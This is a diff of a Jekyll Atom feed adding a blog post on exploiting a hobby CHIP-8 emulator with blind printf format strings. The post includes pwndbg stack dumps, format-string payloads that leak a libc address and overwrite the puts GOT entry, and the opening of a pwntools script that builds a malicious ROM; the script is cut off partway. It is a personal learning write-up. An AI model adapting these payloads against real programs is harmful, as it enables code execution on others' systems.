@@ -1,4 +1,505 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-10-27T20:34:30+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Luca’s Blog</title><subtitle>Join me, Luca Bertozzi, a Theoretical Physics graduate turned cybersecurity enthusiast, as I explores cybersecurity topics  and occasionally delve into Computer Science and Physics.</subtitle><entry><title type="html">(An Attempt at) Pwning a Chip8 Emulator</title><link href="http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator" rel="alternate" type="text/html" title="(An Attempt at) Pwning a Chip8 Emulator" /><published>2024-10-24T00:00:00+08:00</published><updated>2024-10-24T00:00:00+08:00</updated><id>http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator</id><content type="html" xml:base="http://localhost:4000/blog/attempt-at-pwning-a-chip8-emulator"><![CDATA[<p>Recently I was browsing the projects section on the Discord server of the <a href="https://discord.gg/c-asm">C-ASM Community</a>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-03T21:17:18+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Luca’s Blog</title><subtitle>Join me, Luca Bertozzi, a Theoretical Physics graduate turned cybersecurity enthusiast, as I explores cybersecurity topics  and occasionally delve into Computer Science and Physics.</subtitle><entry><title type="html">Pwning the Chip8 Emulator with Blind Format Strings</title><link href="http://localhost:4000/blog/pwning-the-chip8-emulator-with-blind-format-strings" rel="alternate" type="text/html" title="Pwning the Chip8 Emulator with Blind Format Strings" /><published>2024-11-03T00:00:00+08:00</published><updated>2024-11-03T00:00:00+08:00</updated><id>http://localhost:4000/blog/pwning-the-chip8-emulator-with-blind-format-strings</id><content type="html" xml:base="http://localhost:4000/blog/pwning-the-chip8-emulator-with-blind-format-strings"><![CDATA[<p>This is a continuation of my previous post, if you have not read it you can find it <a href="https://lucabtz.com/blog/attempt-at-pwning-a-chip8-emulator">here</a>.</p>
+
+<p>As I was browsing through X I came across this <a href="https://www.synacktiv.com/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from">post</a>.
+When trying to exploit the emulator before I realized I could call <code class="language-plaintext highlighter-rouge">printf</code> with an arbitrary format string, I also checked 
+quickly resources online, but mainly they exploit format string bugs which are not blind (you can see and read the output
+of the <code class="language-plaintext highlighter-rouge">printf</code>). Here the situation is different as the output would be on the terminal of the remote computer which we can’t 
+read. However, as I saw the above post I realized blind format string exploits are a thing and I decided to investigate whether
+they would work here.</p>
+
+<p>For context I reccomend you read the post I linked as well as keep the <a href="https://www.man7.org/linux/man-pages/man3/printf.3.html">man page for printf</a>
+open while you read and refer to it often.</p>
+
+<h2 id="blind-printf-exploit">Blind <code class="language-plaintext highlighter-rouge">printf</code> exploit</h2>
+
+<p>The general idea is using <code class="language-plaintext highlighter-rouge">printf</code> to first leak a <code class="language-plaintext highlighter-rouge">libc</code> address into the Chip8 memory. Then we process this using the Chip8’s
+assembly to compute the address of <code class="language-plaintext highlighter-rouge">system</code>. Finally we use <code class="language-plaintext highlighter-rouge">printf</code> again to overwrite the GOT entry of <code class="language-plaintext highlighter-rouge">puts</code> and we have
+arbitrary code execution.</p>
+
+<p>First step is placing a pointer to some Chip8 memory onto the stack. We will need this because with the format <code class="language-plaintext highlighter-rouge">%n</code>
+(which is the only writing primitive in format strings) we can write only to pointers which are on the stack.</p>
+
+<p>I decided to use address <code class="language-plaintext highlighter-rouge">0x405220</code> which corresponds to the VM address <code class="language-plaintext highlighter-rouge">0x100</code>. This is what the stack looks like at a <code class="language-plaintext highlighter-rouge">printf</code> call</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; stack 15
+00:0000│ rsp 0x7ffdd9892408 —▸ 0x7fa214d6be59 (Mix_FadeInMusicPos+265) ◂— mov ebp, eax
+01:0008│     0x7ffdd9892410 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
+02:0010│     0x7ffdd9892418 —▸ 0x7ffdd9892450 ◂— 2
+03:0018│     0x7ffdd9892420 —▸ 0x7fa214fcd000 (_rtld_global) —▸ 0x7fa214fce2e0 ◂— 0
+04:0020│     0x7ffdd9892428 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
+05:0028│     0x7ffdd9892430 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
+06:0030│     0x7ffdd9892438 ◂— 0x254442d18
+07:0038│     0x7ffdd9892440 ◂— 0x3fe0000000000000
+08:0040│     0x7ffdd9892448 ◂— 0xb00000000
+09:0048│     0x7ffdd9892450 ◂— 2
+0a:0050│     0x7ffdd9892458 —▸ 0x7fa214b91dba (__libc_start_call_main+122) ◂— mov edi, eax
+0b:0058│     0x7ffdd9892460 ◂— 0x3ada368abac064c3
+0c:0060│     0x7ffdd9892468 —▸ 0x4012d6 (main) ◂— push rbp
+0d:0068│     0x7ffdd9892470 ◂— 0x2bac064c3
+0e:0070│     0x7ffdd9892478 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
+</code></pre></div></div>
+<p>I decided to write the address <code class="language-plaintext highlighter-rouge">0x405220</code> at the stack address <code class="language-plaintext highlighter-rouge">0x7ffdd9892568</code>, which is as you can see, where the program name
+is stored on the stack. To do so I used to following code</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">PRINTF_LEAK_ADDR</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"c%6$ln</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Here <code class="language-plaintext highlighter-rouge">PRINTF_LEAK_ADDR</code> is <code class="language-plaintext highlighter-rouge">0x405220</code>. In particular the format stores the value <code class="language-plaintext highlighter-rouge">0x405220</code> into the character counter and then
+dumps it using the <code class="language-plaintext highlighter-rouge">%ln</code> format with the appropriate argument index.</p>
+
+<p>Now that we have the address we want to write too we can leak there some <code class="language-plaintext highlighter-rouge">libc</code> address. In particular we have the address of
+<code class="language-plaintext highlighter-rouge">__libc_start_call_main+122</code>, <code class="language-plaintext highlighter-rouge">0x7fa214b91dba</code>, on the stack. To leak this we need to use first the format <code class="language-plaintext highlighter-rouge">%*15$c</code> which
+reads the argument with index 15 into the character counter. In particular the <code class="language-plaintext highlighter-rouge">*15$</code> part says that the 15th argument, which
+is supposed to be an <code class="language-plaintext highlighter-rouge">int</code>, stores the value that need to be used as the field (refer to the man pages for details).
+This is precisely the argument index of the <code class="language-plaintext highlighter-rouge">__libc_start_call_main+122</code> address.
+Unfortunately, we do not control the type here, the value is interpreted as <code class="language-plaintext highlighter-rouge">int</code>, so we can only read the lower 32 bits. However 
+this will prove sufficient, because we will just overwrite the lower 32 bits of the GOT entry of <code class="language-plaintext highlighter-rouge">puts</code>.
+Further it is a signed <code class="language-plaintext highlighter-rouge">int</code> which will lead to some weirdness when the MSB of the lower 32 bits is set
+(whether this is set or not depends on ASLR, so it is random).</p>
+
+<p>Now that we read the value we dump it into the chip8’s memory at <code class="language-plaintext highlighter-rouge">0x405220</code> using the format <code class="language-plaintext highlighter-rouge">%49$ln</code>. So the final code looks
+like</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%*15$c%49$ln</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now let me go back to the problem with signed <code class="language-plaintext highlighter-rouge">int</code>s. For example let me take the case where <code class="language-plaintext highlighter-rouge">__libc_start_call_main+122</code> is
+<code class="language-plaintext highlighter-rouge">0x7ffff7bc1dba</code>. The lower 32 bits are <code class="language-plaintext highlighter-rouge">0xf7bc1dba</code> and thus have the sign bit set. In this case what gets written at the
+leak location is the value <code class="language-plaintext highlighter-rouge">0x0843e246</code>. However after some thinking about this and how the <code class="language-plaintext highlighter-rouge">printf</code> code may work (I did not 
+actually read the code) I realized that we always have <code class="language-plaintext highlighter-rouge">actual_lower_32_bits + leak_value = 0x100000000</code> (i.e. the leaked value 
+is the two’s complement of the real value) so that we can always recover the actual value from the leaked one anyhow. If the
+sign bit is not set then the leaked value is just the real value of the lower 32 bits.</p>
+
+<p>So we process the leak as follows:</p>
+<ul>
+  <li>look at the page offset of the leaked value (this is independent of ASLR): if it is <code class="language-plaintext highlighter-rouge">0xdba</code> the leak is the actual value
+and we need to do nothing,</li>
+  <li>otherwise compute the actual value by getting the two’s complement.</li>
+</ul>
+
+<p>After implementing this in the chip8’s instructions, we add the offset to <code class="language-plaintext highlighter-rouge">system</code> to the leak with more instructions. 
+Then we can leverage <code class="language-plaintext highlighter-rouge">printf</code> again to overwrite the lower 32-bits of some GOT entry (let me chose <code class="language-plaintext highlighter-rouge">puts</code> which is at
+address <code class="language-plaintext highlighter-rouge">0x405038</code>). To keep the previous setup in place I write this to a different stack location with format strings.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; stack 15
+00:0000│ rsp 0x7ffc39a50a00 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
+01:0008│-038 0x7ffc39a50a08 —▸ 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
+02:0010│-030 0x7ffc39a50a10 —▸ 0x7ff7b12a4000 (_rtld_global) —▸ 0x7ff7b12a52e0 ◂— 0
+03:0018│-028 0x7ffc39a50a18 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
+04:0020│-020 0x7ffc39a50a20 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
+05:0028│-018 0x7ffc39a50a28 ◂— 0x254442d18
+06:0030│-010 0x7ffc39a50a30 ◂— 0x3fe0000000000000
+07:0038│-008 0x7ffc39a50a38 ◂— 0xb00000000
+08:0040│ rbp 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
+09:0048│+008 0x7ffc39a50a48 —▸ 0x7ff7b0e68dba (__libc_start_call_main+122) ◂— mov edi, eax
+0a:0050│+010 0x7ffc39a50a50 ◂— 0x3ada368abac064c3
+0b:0058│+018 0x7ffc39a50a58 —▸ 0x4012d6 (main) ◂— push rbp
+0c:0060│+020 0x7ffc39a50a60 ◂— 0x2bac064c3
+0d:0068│+028 0x7ffc39a50a68 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
+0e:0070│+030 0x7ffc39a50a70 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
+</code></pre></div></div>
+<p>As you can see we both have the leak address and the <code class="language-plaintext highlighter-rouge">puts</code> GOT address somewhere on the stack now.</p>
+
+<p>Now comes the annoying part: we need to generate the format string that will overwrite the GOT entry ourself in the chip8
+program. Ideally one would use the format <code class="language-plaintext highlighter-rouge">%&lt;value to write in decimal ascii&gt;c</code> to load the value in the character counter.
+However converting to decimal is not so easy as there is no division operation on the chip8.</p>
+
+<p>What I ended up doing is checking the values bit by bit and adding the format strings <code class="language-plaintext highlighter-rouge">%1$&lt;some power of 2&gt;c</code>: for example the
+binary number <code class="language-plaintext highlighter-rouge">1011</code> would convert to <code class="language-plaintext highlighter-rouge">%1$1c%1$2c%1$8c</code>. I also spitted the write in two steps as this seemed to work better
+and it also produce smaller format strings, so each time I write only 16 bits using the format <code class="language-plaintext highlighter-rouge">%14$hn</code> (<code class="language-plaintext highlighter-rouge">14</code> references the
+pointer to <code class="language-plaintext highlighter-rouge">puts@got[plt]</code> we previously written on the stack). Splitting the write in two also means we need to update this 
+before the second write.</p>
+
+<p>After this is done the exploit is completed using again the arbitrary call primitive to call <code class="language-plaintext highlighter-rouge">puts@plt</code> with any command we
+want to run as first argument.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>The exploit works fully reliably, however, unless the output of the program is piped into <code class="language-plaintext highlighter-rouge">/dev/null</code> it is extremely slow as
+a lot of characters need to actually be printed. This was just a learning project anyhow and I learned a lot about format string
+exploits along the way, I hope at the end of this journey you have learned something to, dear reader.
+Anyhow here is the exploit code which will generate a malicious ROM that spawns a calculator</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="c1"># pwndbg&gt; ptype /o struct Chip8
+#/* offset      |    size */  type = struct Chip8 {
+#/*      0      |    4096 */    uint8_t memory[4096];
+#/*   4096      |    2048 */    uint8_t display[2048];
+#/*   6144      |       2 */    uint16_t pc;
+#/*   6146      |       2 */    uint16_t index;
+#/*   6148      |      32 */    uint16_t stack[16];
+#/*   6180      |       1 */    uint8_t stack_pointer;
+#/*   6181      |       1 */    uint8_t delay;
+#/*   6182      |       1 */    uint8_t sound;
+#/*   6183      |      16 */    uint8_t registers[16];
+#/* XXX  1-byte hole      */
+#/*   6200      |       2 */    uint16_t op_code;
+#/*   6202      |       1 */    uint8_t draw_flag;
+#/*   6203      |       1 */    uint8_t draw_wait;
+#/*   6204      |      16 */    uint8_t input[16];
+#
+#                               /* total size (bytes): 6220 */
+#                             }
+</span>
+
+<span class="n">ROM_START_OFFSET</span>   <span class="o">=</span> <span class="mh">0x200</span>
+<span class="n">PRINTF_LEAK_OFFSET</span> <span class="o">=</span> <span class="mh">0x100</span>
+
+<span class="c1"># chip struct offsets from rom start
+</span><span class="n">PC_OFFSET</span>          <span class="o">=</span> <span class="mi">6144</span> <span class="o">-</span> <span class="mh">0x200</span>
+<span class="n">SP_OFFSET</span>          <span class="o">=</span> <span class="mi">6180</span> <span class="o">-</span> <span class="mh">0x200</span>
+<span class="n">CHIP_STRUCT_SIZE</span>   <span class="o">=</span> <span class="mi">6220</span>
+
+<span class="n">MUSIC_ADDR</span>         <span class="o">=</span> <span class="mh">0x406990</span>
+<span class="n">CHIP_ADDR</span>          <span class="o">=</span> <span class="mh">0x405120</span>
+<span class="n">BUFFER_START_ADDR</span>  <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="n">ROM_START_OFFSET</span>
+<span class="n">MEMORY_END_ADDR</span>    <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="mh">0x1000</span>
+<span class="n">STACK_ADDR</span>         <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="mi">6148</span>
+<span class="n">PRINTF_LEAK_ADDR</span>   <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="n">PRINTF_LEAK_OFFSET</span>
+<span class="n">PUTS_GOT_ADDR</span>      <span class="o">=</span> <span class="mh">0x405038</span>
+
+<span class="c1"># offset of music from chip.stack
+</span><span class="n">MUSIC_OFFSET</span>       <span class="o">=</span> <span class="n">MUSIC_ADDR</span> <span class="o">-</span> <span class="n">STACK_ADDR</span> 
+<span class="n">SP_VALUE</span>           <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">MUSIC_OFFSET</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">PRINTF_PLT</span>         <span class="o">=</span> <span class="mh">0x401080</span>
+<span class="n">PUTS_PLT</span>           <span class="o">=</span> <span class="mh">0x4010a0</span>
+
+<span class="n">LEAK_SYSTEM_OFFSET</span> <span class="o">=</span> <span class="mh">0x26296</span>
+
+    <span class="c1">#struct Mix_Music {
+</span>    <span class="c1">#    Mix_MusicInterface *interface;
+</span>    <span class="c1">#    void *context;
+</span>    <span class="c1">#
+</span>    <span class="c1">#    bool playing;
+</span>    <span class="c1">#    Mix_Fading fading;
+</span>    <span class="c1">#    int fade_step;
+</span>    <span class="c1">#    int fade_steps;
+</span>    <span class="c1">#
+</span>    <span class="c1">#    char filename[1024];
+</span>    <span class="c1">#};
+</span>
+    <span class="c1">#sizeof(struct Mix_Music) = 1056
+</span>    <span class="c1">#sizeof(struct Mix_Music) - filename = 32
+</span>    <span class="c1">#sizeof(Mix_MusicInterface) = 224
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, SetVolume) = 56
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Play) = 72
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Seek) = 104
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Stop) = 192
+</span>
+<span class="n">FAKE_MUSIC_ADDR</span>    <span class="o">=</span> <span class="mh">0x406a5e</span>
+<span class="n">INTERFACE_ADDR</span>     <span class="o">=</span> <span class="n">MEMORY_END_ADDR</span> <span class="o">-</span> <span class="mi">224</span>
+<span class="n">PLAY_ADDR</span>          <span class="o">=</span> <span class="n">INTERFACE_ADDR</span> <span class="o">+</span> <span class="mi">72</span>
+<span class="n">PLAY_CHIP_ADDR</span>     <span class="o">=</span> <span class="n">PLAY_ADDR</span> <span class="o">-</span> <span class="n">CHIP_ADDR</span>
+
+
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"A"</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">n</span> <span class="o">*</span> <span class="n">padding</span><span class="p">)[:</span><span class="n">n</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">class</span> <span class="nc">Asm</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="mh">0x200</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">patches</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">labels</span> <span class="o">=</span> <span class="p">{}</span>
+
+    <span class="k">def</span> <span class="nf">_validate_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span> <span class="o">==</span> <span class="n">addr</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="k">assert</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">_validate_x</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xf</span> <span class="o">==</span> <span class="n">x</span>
+
+    <span class="k">def</span> <span class="nf">_validate_nn</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">nn</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">nn</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="n">nn</span>
+
+    <span class="k">def</span> <span class="nf">_increment_pc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">+=</span> <span class="mi">2</span>
+
+    <span class="k">def</span> <span class="nf">_pack_opcode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">opcode</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">jump</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x2000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">set_index</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xa000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">store_vx</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xf055</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">load_vx</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xf065</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">load_vx_imm</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">imm</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_nn</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x6000</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">imm</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">clear_screen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x00e0</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">set_sound</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xf018</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">bitwise_and</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x8002</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">bitwise_xor</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x8003</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span>
+
